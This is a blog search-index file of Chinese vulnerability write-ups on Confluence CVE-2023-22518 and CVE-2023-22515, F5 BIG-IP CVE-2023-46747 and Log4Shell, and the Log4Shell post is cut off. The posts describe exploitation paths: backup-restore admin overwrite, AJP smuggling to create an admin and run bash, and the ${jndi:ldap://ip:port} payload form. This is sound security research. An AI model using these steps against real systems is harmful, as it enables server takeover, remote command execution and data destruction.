<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2023-22518 Critical Privilege Escalation Vulnerability in Atlassian&#39;s Confluence</title>
    <link href="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/"/>
    <url>/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence"><a href="#CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence" class="headerlink" title="CVE-2023-22518 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence"></a>CVE-2023-22518 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在Confluence中存在权限验证漏洞，攻击者可以通过发送而已请求来获取服务器权限，造成远程命令执行。</p><p>！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><p>！！！！注意，测试该漏洞会导致数据不可逆损失，如需测试漏洞请一定要使用测试环境！！！！</p><p>！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和上次一样，老样子diff一下：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231031183007793.png" class=""><p>修改很多，不过最引人注目的还是很多class文件都新增了两个注解，看起来就是对权限做了处理：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231031183544278.png" class="" title="image-20231031183544278"><p>那么就来了解下什么是<code>websudo</code>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">WebSudo</span> 是 Atlassian Confluence中的一项安全特性。它的目的是确保用户在执行一些敏感操作之前重新验证自己的凭据，以提高系统的安全性。<br><br>当一个已登录的用户试图进行一些可能对系统有重大影响的操作，例如更改系统设置、安装插件等，Confluence 会要求该用户重新输入密码来确认他们的身份。这种再次确认身份的机制称为 WebSudo。<br><br>因为和sudo很像，所以就叫了websudo。<br></code></pre></td></tr></table></figure><p>看来关键点就在权限上了，再根据长亭的通告，因为confluence滥用了struts的继承关系，所以导致了部分权限绕过，并且漏洞利用会导致数据丢失。</p><p>在diff代码的时候看到了如下内容，最开始的思路是直接通过<code>bootstrap</code>来把<code>confluence</code>的数据库切换到自己的数据库上（当然当时我并不了解confluence的bootstrap是干嘛的），走了弯路，后来想了想这样的话也不会丢失数据无法恢复，应该是一种覆盖的操作才对：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102142344827.png" class="" title="image-20231102142344827"><p>既然说到了权限问题，这里可以简单了解下：</p><p><a href="https://struts.apache.org/core-developers/namespace-configuration">https://struts.apache.org/core-developers/namespace-configuration</a></p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231101024742977.png" class="" title="image-20231101024742977"><p>实际上<code>confluence</code>不光是会去<code>defualt</code>来进行检查，而是会去被继承的<code>namespace</code>逐层递归到<code>default</code>，所以寻找继承了<code>admin</code>的<code>namespace</code>最后发现<code>struts.xml</code>中有这么一段：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102135950080.png" class="" title="image-20231102135950080"><p>说明<code>json</code>的命名空间可以进行递归到admin，也就是通告中说的滥用继承关系导致部分权限绕过。</p><p>那么接下来就明了了，只需要寻找能够破坏数据的功能就可以了，实在是不想看官方文档，让我们感谢人工智能：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143252681.png" class=""><p>很好，接下来就可以去confluence里面看备份相关的东西了：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143651277.png" class="" title="image-20231102143651277"><p>经过了几次创建和还原可以确定这里确实能够还原admin的密码（毕竟是备份）。</p><p>直接创建一个备份并且下载下来，然后去搜索restore相关的action，最终在不断地尝试下定位到了一个action：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102143924658.png" class="" title="image-20231102143924658"><p>尝试用<code>json</code>命名空间去访问这个action，得到了一些有趣的东西（注意这里要用POST进行访问）：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144319982.png" class="" title="image-20231102144319982"><p>看到下面是我创建的很多备份文件，但是这里其实是有坑的，在直接构造一个文件上传包的时候，对面返回的相应是这样的：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144656162.png" class="" title="image-20231102144656162"><p>很奇怪，我明明创建的是<code>site</code>的包，为什么说我尝试恢复<code>space</code>，又创建了几个无果后，觉得还是要去看看代码，直接搜索提示语：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102144818992.png" class="" title="image-20231102144818992"><p>然后进入<code>SetupRestoreAction.class</code>下个断点，可以看到导致这个问题的原因是<code>validate()</code>方法检验了一下<code>exportScope</code>是否是<code>ALL</code>，但是我们创建的是<code>SITE</code>好家伙，这哪有ALL的包啊：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102152808970.png" class="" title="image-20231102152808970"><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102150744866.png" class=""><p>（其实在这里直接改成ALL应该接可以了）</p><p>但是我想找到根本原因，问题只能是出在备份的时候了，发现在confluence的备份中其实只有两个选项：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102154048341.png" class="" title="image-20231102154048341"><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102154111144.png" class="" title="image-20231102154111144"><p>这个时候就要用另一个接口了：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102161124328.png" class="" title="image-20231102161124328"><p>在登陆状态下访问<code>json/backup.action</code>然后生成的被分包所带的是<code>ALL</code>标签，再次构造包：</p><img src="/2023/11/07/CVE-2023-22518-Critical-Privilege-Escalation-Vulnerability-in-Atlassian-s-Confluence/image-20231102161312582.png" class="" title="image-20231102161312582"><p>可以看到跳转地址和struts.xml写的一样，这里要注意<code>synchronous=true</code>的设置，发送完包后等待一小会儿，就会将备份导入，当然原先设置好的管理员账号密码也会被备份中的内容覆盖。</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>参考历史漏洞即可RCE，老生常谈，不过多说啦。</p>]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-46747 F5 BIG-IP RCE</title>
    <link href="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/"/>
    <url>/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-46747-F5-BIG-IP-RCE"><a href="#CVE-2023-46747-F5-BIG-IP-RCE" class="headerlink" title="CVE-2023-46747 F5 BIG-IP RCE"></a>CVE-2023-46747 F5 BIG-IP RCE</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>全版本</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接<a href="https://my.f5.com/manage/s/downloads?productFamily=BIG-IP&productLine=big-ip_v15.x&version=15.1.8&container=Virtual-Edition&files=BIGIP-15.1.8-0.0.7.ALL-vmware.ova&locations=JAPAN">下载</a>镜像用vmware启动即可。</p><p>默认账号密码为：admin&#x2F;default</p><h2 id="漏洞分析-复现"><a href="#漏洞分析-复现" class="headerlink" title="漏洞分析&amp;&amp;复现"></a>漏洞分析&amp;&amp;复现</h2><p>通过官方的修复补丁可以看出来和权限验证相关，并且修改了<code>proxy_ajp_conf</code>文件中的内容，再结合已有信息推测这是一个AJP走私问题（然而就在初步验证成功的时候chen师傅发了一句话……）</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030183353275.png" class="" title="image-20231030183353275"><p>擦，点开一看竟然是poc，看了下poc和&#x2F;usr&#x2F;share&#x2F;tomcat&#x2F;conf&#x2F;server.xml</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030183853806.png" class="" title="image-20231030183853806"><p>省了很多事，这下确定了是AJP走私的问题，因为BIG-IP的Apache是基于Apache 2.4.6的定制版，所以也会受AJP走私的影响。</p><p>AJP走私大家并不陌生，比如ghostcat和CVE-2022-26377这类的漏洞就是AJP走私造成的，那么接下来的利用就比较简单了：</p><ol><li><p>在BIG-IP的历史漏洞<a href="https://xz.aliyun.com/t/11418#toc-7">CVE-2022-1388</a>中得知，我们可以从<code>/mgmt/tm/util/bash</code>来执行命令，但是当时是基于<code>X-F5-Auth-Token</code>权限的绕过，那么既然权限绕过已经修复了，我们就需要一个可以通过认证的<code>X-F5-Auth-Token</code>，那么也就是需要创建一个管理员用户。</p></li><li><p>那么创建账户这个问题就来到了tmui上，我们通过AJP走私到<code>/tmui/Control/form</code>调用<code>/tmui/system/user/create.jsp</code>来创建一个新的用户。</p></li><li><p>参考<a href="https://clouddocs.f5.com/products/big-iq/mgmt-api/v5.4/ApiReferences/bigiq_api_ref/r_auth_login.html">官方文档</a>的方式，创建完新的用户之后就可以通过<code>/mgmt/shared/authn/login</code>然后返回第一步来执行命令。</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030230918856.png" class="" title="image-20231030230918856"></li></ol><p>流程概括下来就是：通过<code>/tmui/Control/form</code>来调用<code>user/create.jsp</code>然后从<code>/mgmt/shared/authn/login</code>获取新的token，最后在<code>/mgmt/tm/util/bash</code>执行命令。</p><p>这其中有一个需要注意的点：</p><p>tmsh中进行了csrf检测，所以在第一步调用的时候需要构造好三个参数<code>_timenow</code> <code> Tmui-Dubbuf</code>和<code>_bufvalue</code>，满足<code>_bufvalue</code>的值等于<code>Tmui-Dubbuf</code>+<code>Tmui-Dubbuf</code>。</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030221855165.png" class="" title="image-20231030221855165"><p>在nuclei给的poc中用的是 <code> Tmui-Dubbuf</code>&#x3D;BBBBBBBBBBB、<code>_timenow</code>&#x3D;a、<code>_bufvalue</code>&#x3D;eIL4RUnSwXYoPUIOGcOFx2o00Xc&#x3D;</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030223436120.png" class="" title="image-20231030223436120"><p>我们也使用这三个键值对进行构造，那么最后得到的poc就是：</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225639449.png" class=""><p>使用<code>Transfer-Encoding: chunked</code>时，会使用分块传输编码,第一个204就是trunk size的大小，用十进制转换为十六进制后对应516，也就是我们走私请求的长度，最后的0表示结尾，如果不是用https看到的明文如下：</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225723604.png" class=""><p>这个步骤需要多试几次，不一定第一次就成功，发现返回的不是登录界面后就可以进行下一步了：</p><p>通过账号密码获取到token的值。</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225832110.png" class=""><p>然后执行命令：</p><img src="/2023/11/07/CVE-2023-46747%20F5%20BIG-IP%20RCE/image-20231030225947658.png" class="" title="image-20231030225947658">]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&#39;s Confluence</title>
    <link href="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian&#39;s%20Confluence/"/>
    <url>/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian&#39;s%20Confluence/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22515-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence"><a href="#CVE-2023-22515-Critical-Privilege-Escalation-Vulnerability-in-Atlassian’s-Confluence" class="headerlink" title="CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence"></a>CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence 是 Atlassian 公司开发的一款团队合作软件，主要用于团队成员共享知识、协作文档和集中存储资料。它广泛应用于各种组织中，不仅是技术团队，还有其他任何需要文档合作或知识共享的团队。</p><p>在8.0.0&lt;CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.2.3、CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.3.3、CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.4.3、CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian’s Confluence&lt;8.5.2中存在权限提升漏洞，导致任意用户可以创建新的管理员账户。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>既然已经修复过了，就按照老样子，分析一下差异，我这里直接用了8.5.1和8.5.2版本的jar来进行分析：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012132908575.png" class="" title="image-20231012132908575"><p>首先重要的变化就是删除和新增了几个类：</p><p>删除：</p><p><code>ServerInfoAction</code>类</p><p><code>ServerInfoFilter</code>类</p><p>新增：</p><p><code>ReadOnlyApplicationConfig</code>类<br><code>ReadOnlySetupPersister</code>类<br>主要是新增的两个类，可以看到两个<code>ReadOnly</code>都继承自原有的类，可以看作是一种“增强”，当使用setter的时候，抛出一个<code>UnsupportedOperationException</code>来拒绝修改，这样就将类变为只读来规避某些风险。</p><p>具体就是在<code>BootstrapStatusProviderImpl</code>的修改中体现的，将原先的<code>this.delegate.getApplicationConfig();</code>改为<code>return new ReadOnlyApplicationConfig(this.delegate.getApplicationConfig());</code></p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012141836976.png" class="" title="image-20231012141836976"><p>那么接下来需要做的就是如何设置这些属性呢？查看<code>interceptors</code>，和官方的描述，这个<code>SafeParametersInterceptor</code>引起了我的注意：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012194917943.png" class=""><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012153302736.png" class="" title="image-20231012153302736"><p>把表单内容注入到<code>action properties</code>，那么八九不离十就是这玩意了，里面都是一些安全检查相关的，尤其是检查<code>@ParameterSafe</code>这个注解，并且有这么一段<code>doInterceptor</code>：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012195013625.png" class="" title="image-20231012195013625"><p>这下可好了，那么就直接去看父类，但是点了一下竟然提示我<code>Cannot find declaration to go to</code>由于比较懒，直接上google搜索一下文档，然后上Github翻源码去了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012161818082.png" class="" title="image-20231012161818082"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012160933343.png" class="" title="image-20231012160933343"><p>看到了具体源码后就明白了，前面获取<code>action</code>信息后仅仅判断了<code>NoParameters</code>就进行了<code>setParameters</code>，这就很明了了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012162618100-1697122530365-2.png" class="" title="image-20231012162618100"><p>struts系列的漏洞处理流程interceptor—Action</p><p>这段XML配置定义了一个名为<code>params</code>的拦截器，并指定了该拦截器的具体实现类为<code>com.atlassian.xwork.interceptors.SafeParametersInterceptor</code></p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012173735463.png" class="" title="image-20231012173735463"><p>然后就是寻找触发点，直接搜索<code>params</code>，看来确实有所发现：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012173531182.png" class="" title="image-20231012173531182"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012173550112.png" class="" title="image-20231012173550112"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012204057094.png" class="" title="image-20231012204057094"><p>看了看所有的<code>stack</code>，只要下面的<code>action</code>用的不是<code>setupStack</code>就都可以使用，多试试应该就可以了（我尝试后发现只有<code>validatingStack</code>或者什么都不写的用默认的才可以成功，其他的可以进倒是，但是没法创建用户，不知道为啥）：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012204203122.png" class="" title="image-20231012204203122"><p>到这里漏洞分析就结束了。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先弄个环境：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012114259263.png" class="" title="image-20231012114259263"><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012163733457.png" class="" title="image-20231012163733457"><p><code>sqlserver</code>版本太低，直接放弃复现（不是</p><p>最后选择弄个<code>PostgreSQL</code>来代替吧：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012172942216.png" class="" title="image-20231012172942216"><p>然后就成功进入初始界面了，打开bp，然后浏览器访问<code>/setup/setupadministrator-start.action</code>发现已经没办法进入注册流程了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012204451547.png" class=""><p>覆盖属性后刷新，发现已经可以重新设置管理员了：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012210036843.png" class=""><p>新建完成，查看结果：</p><img src="/2023/10/18/CVE-2023-22515%20Critical%20Privilege%20Escalation%20Vulnerability%20in%20Atlassian's%20Confluence/image-20231012205136650.png" class="" title="image-20231012205136650"><p>关于RCE已经有师傅提到了，我打算再看看有没有什么更加方便的方式，如果有发现再发文。</p>]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4Shell</title>
    <link href="/2023/09/28/Log4Shell/"/>
    <url>/2023/09/28/Log4Shell/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4Shell"><a href="#Log4Shell" class="headerlink" title="Log4Shell"></a>Log4Shell</h1><p>配套代码在：<a href="https://github.com/springkill/top50vulns_2023">top50vulns_2023</a>配合食用更佳！</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>本漏洞是因为log4j官方提供了一个名为<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Message Lookup Substitution</a>的功能，此功能会动态地获取某些内容：<br>如字符串<code>Running $&#123;java:runtime&#125;</code>会被解析为<code>Running Java version 1.8xxx</code>.</p><p>官方文档中对此的部分描述如下：</p><p>The JavaLookup allows Java environment information to be retrieved in convenient preformatted strings using the <code>java:</code> prefix.</p><p>使用如下内容可以检索Java相关信息：</p><table><thead><tr><th align="left">Key</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">version</td><td align="left">The short Java version, like:<code>Java version 1.7.0_67</code></td></tr><tr><td align="left">runtime</td><td align="left">The Java runtime version, like:<code>Java(TM) SE Runtime Environment (build 1.7.0_67-b01) from Oracle Corporation</code></td></tr><tr><td align="left">vm</td><td align="left">The Java VM version, like:<code>Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode)</code></td></tr><tr><td align="left">os</td><td align="left">The OS version, like:<code>Windows 7 6.1 Service Pack 1, architecture: amd64-64</code></td></tr><tr><td align="left">locale</td><td align="left">System locale and file encoding information, like:<code>default locale: en_US, platform encoding: Cp1252</code></td></tr><tr><td align="left">hw</td><td align="left">Hardware information, like:<code>processors: 4, architecture: amd64-64, instruction sets: amd64</code></td></tr></tbody></table><p>同时官方也提供了JNDI功能来调用远程方法：</p><h3 id="JNDI-Lookup"><a href="#JNDI-Lookup" class="headerlink" title="JNDI Lookup"></a>JNDI Lookup</h3><p>As of Log4j 2.17.0 JNDI operations require that <code>log4j2.enableJndiLookup=true</code> be set as a system property or the corresponding environment variable for this lookup to function. See the <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#enableJndiLookup">enableJndiLookup</a> system property.</p><p>The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp&#x2F;env&#x2F;, however if the key contains a “:” no prefix will be added.</p><p>The JNDI Lookup only supports the java protocol or no protocol (as shown in the example below).</p><p>使用如下方式开启JNDI检索：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">File</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Application&quot;</span> <span class="hljs-attr">fileName</span>=<span class="hljs-string">&quot;application.log&quot;</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d %p %c&#123;1.&#125; [%t] $$&#123;jndi:logging/context-name&#125; %m%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">PatternLayout</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">File</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也正是提供了JNDI查找的功能，导致了漏洞的出现。</p><p>当<code>JNDI</code>与 <code>LDAP</code> 协议搭配使用时，将从远程源获取指定的 Java 类并将其反序列化，在此过程中执行该类的一些代码，造成反序列化攻击。<br>payload形式例如：<code>$&#123;jndi:ldap://ip:port&#125;</code></p><h2 id="漏洞分析-复现"><a href="#漏洞分析-复现" class="headerlink" title="漏洞分析&amp;&amp;复现"></a>漏洞分析&amp;&amp;复现</h2><p>先写一个demo来实现log4Shell。</p><p>在log4j2中存在一个接口名为StrLookup：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.logging.log4j.core.lookup;<br><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.core.LogEvent;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StrLookup</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">CATEGORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lookup&quot;</span>;<br><br>    String <span class="hljs-title function_">lookup</span><span class="hljs-params">(String key)</span>;<br><br>    String <span class="hljs-title function_">lookup</span><span class="hljs-params">(LogEvent event, String key)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当在log4j2中使用了如<code>$&#123;prefix:key&#125;</code>的类型时，就会调用相应的<code>StrLookup</code>。</p><p>这个接口被以<code>Map&lt;String,StrLookup&gt;</code>的方式封装在了<code>Interpolator</code>中，可以在项目代码的<code>断点1</code>处打断点观察封装在<code>Interpolator</code>内部的<code>StrLookup</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Interpolator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;String, String&gt; properties)</span> &#123;<br>        <span class="hljs-built_in">this</span>.strLookupMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-built_in">this</span>.defaultLookup = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapLookup</span>((Map)(properties == <span class="hljs-literal">null</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>() : properties));<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;log4j&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Log4jLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemPropertiesLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnvironmentLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;main&quot;</span>, MainMapLookup.MAIN_SINGLETON);<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;marker&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarkerLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;lower&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LowerLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;upper&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpperLookup</span>());<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;jndi&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception | LinkageError var9) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;jndi&quot;</span>, var9);<br>        &#125;<br><br>        <span 